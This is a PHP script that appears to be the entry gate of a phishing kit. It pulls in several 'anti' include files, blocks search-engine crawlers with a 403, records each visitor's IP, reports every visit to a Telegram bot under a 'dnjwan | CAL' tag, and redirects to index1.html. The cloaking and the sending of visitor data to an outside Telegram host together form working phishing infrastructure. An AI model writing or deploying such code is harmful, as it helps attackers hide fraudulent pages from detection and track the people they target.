
<?php
include('settings.php');
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');
function curl_request($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_AUTOREFERER => TRUE,
        CURLOPT_HEADER => 0,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => TRUE
    ]);
    $data = curl_exec($ch);
    if (curl_errno($ch)) {
        // Error handling; could log or handle the error appropriately
        error_log('Curl error: ' . curl_error($ch));
    }
    curl_close($ch);
    return $data;
}

if (isBot($_SERVER['HTTP_USER_AGENT'])) {
    denyAccess("Bot detected");
}


$visitor_ip = $_SERVER['REMOTE_ADDR'];
$_SESSION['ip'] = $visitor_ip;

// Function to handle access denial



// If all checks pass, log the allowed access


function isBot($userAgent) {
    $knownBots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou'];
    return (bool) array_filter($knownBots, function ($bot) use ($userAgent) {
        return strpos($userAgent, $bot) !== false;
    });
}



function logAccess($message) {
    global $botvisit, $idvisit, $visitor_ip;
    $text = "[ 🍁 dnjwan| CAL | VISIT: 🍁 ] \n" . $message . ": " . $visitor_ip;
    file_get_contents("https://api.telegram.org/bot$botvisit/sendMessage?chat_id=$idvisit&text=" . urlencode($text));
}

function denyAccess($reason) {
    logAccess($reason);
    header('HTTP/1.1 403 Forbidden');
    exit('Access Denied: ' . $reason);
} 
logAccess("NEW VISIT");
echo "<meta http-equiv='refresh' content='0; url=index1.html'/>";

?>